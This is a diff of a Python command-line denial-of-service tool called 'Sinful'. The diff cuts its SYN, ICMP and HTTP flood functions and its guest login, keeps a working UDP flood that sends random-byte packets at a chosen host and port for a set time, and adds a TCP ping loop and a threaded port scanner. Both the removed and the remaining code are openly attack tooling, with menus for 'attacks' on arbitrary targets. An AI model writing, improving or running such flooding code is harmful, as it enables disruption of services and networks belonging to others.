@@ -10,33 +10,19 @@ import os
 
 methods = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                     \033[00mDDOS Methods\033[91m                     ║               
+║                     \033[00mDDos Methods\033[91m                     ║               
 ║══════════════════════════════════════════════════════║
-║ \033[00mUDP (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m UDP Attack.\033[91m         ║
-║ \033[00mSYN (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m SYN Attack.\033[91m         ║
-║ \033[00mICMP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m ICMP Attack.\033[91m        ║
-║ \033[00mHTTP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m HTTP Attack.\033[91m        ║
+║ \033[00mUDP <IP> <PORT> <TIME> <SIZE>  \033[91m|\033[00m UDP Attack.\033[91m         ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
-info = """\033[91m
+tools = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                     \033[00mSinful Info\033[91m                      ║
+║                        \033[00mTools\033[91m                         ║
 ║══════════════════════════════════════════════════════║
-║ \033[00m[+] Sinful Was Made By Zinqo.\033[91m                        ║
-║ \033[00m[+] Discord: Zinqo#7708.\033[91m                             ║
-║ \033[00m[+] Instagram: itszinqo.\033[91m                             ║
-║ \033[00m[+] YouTube: Zinqo.\033[91m                                  ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
-
-extras = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                        \033[00mExtras\033[91m                        ║
-║══════════════════════════════════════════════════════║
-║ \033[00mAttacks          \033[91m|\033[00m Shows How Many Running Attacks.\033[91m   ║
-║ \033[00mStop             \033[91m|\033[00m Stops All Running Attacks.\033[91m        ║
-║ \033[00mResolve (DOMAIN) \033[91m|\033[00m Grabs A Domains IP.\033[91m               ║
+║ \033[00mPing <IP> <PORT>         \033[91m|\033[00m Ping An Ip.\033[91m               ║
+║ \033[00mPortscan <IP> <DST PORT> \033[91m|\033[00m Scan Open Ports.\033[91m          ║
+║ \033[00mResolve <DOMAIN>         \033[91m|\033[00m Grabs A Domains IP.\033[91m       ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
@@ -44,38 +30,28 @@ help = """\033[91m
 ╔══════════════════════════════════════════════════════╗
 ║                    \033[00mBasic Commands\033[91m                    ║
 ║══════════════════════════════════════════════════════║
-║ \033[00mMethods \033[91m|\033[00m Shows DDOS Methods For Sinful.\033[91m             ║
-║ \033[00mExtras  \033[91m|\033[00m Shows Extra Commands For Sinful.\033[91m           ║
-║ \033[00mUpdates \033[91m|\033[00m Shows Update Notes For Sinful.\033[91m             ║
-║ \033[00mInfo    \033[91m|\033[00m Shows Sinful Info.\033[91m                         ║
-║ \033[00mClear   \033[91m|\033[00m Clears Screen.\033[91m                             ║
+║ \033[00mMethods \033[91m|\033[00m Shows DDos Methods For Sinful.\033[91m             ║
+║ \033[00mTools   \033[91m|\033[00m Shows Tools For Sinful.\033[91m                    ║
+║ \033[00mAttacks \033[91m|\033[00m Shows How Many Running Attacks.\033[91m            ║
+║ \033[00mStop    \033[91m|\033[00m Stops All Running Attacks.\033[91m                 ║
+║ \033[00mClear   \033[91m|\033[00m Clear Screen.\033[91m                              ║
 ║ \033[00mExit    \033[91m|\033[00m Exits Out Of Sinful.\033[91m                       ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
-
-updatenotes = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                     \033[00mUpdate Notes\033[91m                     ║
-║══════════════════════════════════════════════════════║
-║ \033[00m[+] Timeout Bug Fixed.\033[91m                               ║
-║ \033[00m[+] Took Out Some Tools.\033[91m                             ║
-║ \033[00m[+] User And Pass Changed To Sinful.\033[91m                 ║
-║ \033[00m[+] To Be A Guest Type "Guest" For User And Pass.\033[91m    ║
-║ \033[00m[+] All Tools Fixed And Working.\033[91m                     ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
 banner = """
 
+		      		   \033[1;91mS I N F U L L\033[00m
 			        Angels go to heaven
 			   Demons meet the gates of hell
-		      Sinfull people are punished put in hell
-		      		   \033[1;91mS I N F U L L\033[00m
+		      Sinful people are punished put in hell
 """
 
 cookie = open(".Sinful_Cookie","w+")
 
 fsubs = 0
+tpings = 0
+pscans = 0
 liips = 0
 tattacks = 0
 uaid = 0
@@ -84,27 +60,7 @@ iaid = 0
 haid = 0
 aid = 0
 attack = True
-http = True
 udp = True
-syn = True
-icmp = True
-
-
-def synsender(host, port, timer, punch):
-	global said
-	global syn
-	global aid
-	global tattacks
-	timeout = time.time() + float(timer)
-	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)
-
-	said += 1
-	tattacks += 1
-	aid += 1
-	while time.time() < timeout and syn and attack:
-		sock.sendto(punch, (host, int(port)))
-	said -= 1
-	aid -= 1
 
 def udpsender(host, port, timer, punch):
 	global uaid
@@ -123,48 +79,10 @@ def udpsender(host, port, timer, punch):
 	uaid -= 1
 	aid -= 1
 
-def icmpsender(host, port, timer, punch):
-	global iaid
-	global icmp
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-	iaid += 1
-	aid += 1
-	tattacks += 1
-	while time.time() < timeout and icmp and attack:
-		sock.sendto(punch, (host, int(port)))
-	iaid -= 1
-	aid -= 1
-
-def httpsender(host, port, timer, punch):
-	global haid
-	global http
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-
-	haid += 1
-	aid += 1
-	tattacks += 1
-	while time.time() < timeout and icmp and attack:
-		try:
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock.sendto(punch, (host, int(port)))
-			sock.close()
-		except socket.error:
-			pass
-
-	haid -= 1
-	aid -= 1
-
-
 def main():
 	global fsubs
+	global tpings
+	global pscans
 	global liips
 	global tattacks
 	global uaid
@@ -174,13 +92,10 @@ def main():
 	global aid
 	global attack
 	global dp
-	global syn
-	global icmp
-	global http
 
 	while True:
 		sys.stdout.write("")
-		sin = input("cmd:  ").lower()
+		sin = input("cmd> ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -189,8 +104,8 @@ def main():
 		elif sinput == "help":
 			print (help)
 			main()
-		elif sinput == "extras":
-			print (extras)
+		elif sinput == "tools":
+			print (tools)
 			main()
 		elif sinput == "exit":
 			print ("[\033[91mSin\033[00m] You Are Exiting Out Of Sinful.\n")
@@ -198,26 +113,62 @@ def main():
 		elif sinput == "methods":
 			print (methods)
 			main()
-		elif sinput == "updates":
-			print (updatenotes)
-			main()
-		elif sinput == "info":
-			print (info)
 			main()
 		elif sinput == "attacks":
 			print ("[\033[91mSin\033[00m] Total Attacks Running: {}\n".format (aid))
 			main()
+		elif sinput == "ping":
+			tpings += 1
+			try:
+				sinput, host, port = sin.split(" ")
+				print ("[\033[91mSin\033[00m] Starting ping on host: {}".format (host))
+				try:
+					ip = socket.gethostbyname(host)
+				except socket.gaierror:
+					print ("[\033[91mSin\033[00m] Host un-resolvable")
+					main()
+				while True:
+					try:
+						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						sock.settimeout(2)
+						start = time.time() * 1000
+						sock.connect ((host, int(port)))
+						stop = int(time.time() * 1000 - start)
+						print ("[\033[91mSin\033[00m] {}:{} | Time={}ms [\033[91mOnline\033[00m]".format(ip, port, stop))
+						sock.close()
+						time.sleep(1)
+					except socket.error:
+						print ("[\033[91mSin\033[00m] {}:{} [\033[91mOffline\033[00m]".format(ip, port))
+						time.sleep(1)
+					except KeyboardInterrupt:
+						print("")
+						main()
+			except ValueError:
+				print ("[\033[91mSin\033[00m] The command {} requires an argument".format (sinput))
+				main()
+		elif sinput == "portscan":
+			port_range = int(sin.split(" ")[2])
+			pscans += 1
+			def scan(port, ip):
+				try:
+					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					sock.connect((ip, port))
+					print ("[\033[91mSin\033[00m] {}\033[91m:\033[00m{} [\033[91mOpen\033[00m]".format (ip, port))
+					sock.close()
+				except socket.error:
+					return
+				except KeyboardInterrupt:
+					print ("\n")
+			for port in range(1, port_range+1):
+				ip = socket.gethostbyname(sin.split(" ")[1])
+				threading.Thread(target=scan, args=(port, ip)).start()
 		elif sinput == "resolve":
 			liips += 1
 			host = sin.split(" ")[1]
 			host_ip = socket.gethostbyname(host)
-			print ("[\033[91mSin\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
+			print ("[\033[91mSin\033[00m] {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
 			main()
 		elif sinput == "udp":
-			if username == "Guest":
-				print ("[\033[91mSin\033[00m] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
 				try:
 					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
@@ -230,49 +181,6 @@ def main():
 				except socket.gaierror:
 					print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
 					main()
-		elif sinput == "http":
-			try:
-				sinput, host, port, timer, pack = sin.split(" ")
-				socket.gethostbyname(host)
-				print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
-				punch = random._urandom(int(pack))
-				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
-			except ValueError:
-				print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-				main()
-			except socket.gaierror:
-				print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
-				main()
-		elif sinput == "icmp":
-			if username == "Guest":
-				print ("[\033[91mSin\033[00m] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
-					main()
-		elif sinput == "syn":
-			try:
-				sinput, host, port, timer, pack = sin.split(" ")
-				socket.gethostbyname(host)
-				print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
-				punch = random._urandom(int(pack))
-				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
-			except ValueError:
-				print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-				main()
-			except socket.gaierror:
-				print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
-				main()
 		elif sinput == "stop":
 			print ("[\033[91mSin\033[00m] All Running Attacks Have Been Stopped.\n")
 			attack = False
@@ -289,13 +197,6 @@ def main():
 						print ("[\033[91mSin\033[00m] No UDP Processes Running.")
 						udp = True
 						main()
-			if what == "icmp":
-				print ("Stopping All ICMP Attacks.\n")
-				icmp = False
-				while not icmp:
-					print ("[\033[91mSin\033[00m] No ICMP Processes Running.")
-					udp = True
-					main()
 		else:
 			print ("[\033[91mSin\033[00m] {} Is Not A Command.\n".format(sinput))
 			main()
@@ -303,7 +204,7 @@ def main():
 
 
 try:
-	users = ["", "Guest"]
+	users = ["", ""]
 	clear = "clear"
 	os.system (clear)
 	username = getpass.getpass ("[+] Username: ")
@@ -315,31 +216,14 @@ try:
 except KeyboardInterrupt:
 	exit()
 try:
-	passwords = ["", "Guest"]
+	passwords = ["", ""]
 	password = getpass.getpass ("[+] Password: ")
 	if user == "":
 		if password == passwords[0]:
 			print ("[+] Login Correct.")
 			print ("[+] Type Help To See Commands.")
 			cookie.write("DIE")
-			time.sleep(3)
-			os.system (clear)
-			try:
-				os.system ("clear")
-				print (banner)
-				main()
-			except KeyboardInterrupt:
-				print ("\n[\033[91mSin\033[00m] Ctrl-C Has Been Pressed.\n")
-				main()
-		else:
-			print ("[+] Incorrect, Exiting.\n")
-			exit()
-	if user == "Guest":
-		if password == passwords[1]:
-			print ("[+] Login Correct.")
-			print ("[+] Certain Methods Will Not Be Available To You.")
-			print ("[+] Type Help To See Commands.")
-			time.sleep(5)
+			time.sleep(1)
 			os.system (clear)
 			try:
 				os.system ("clear")
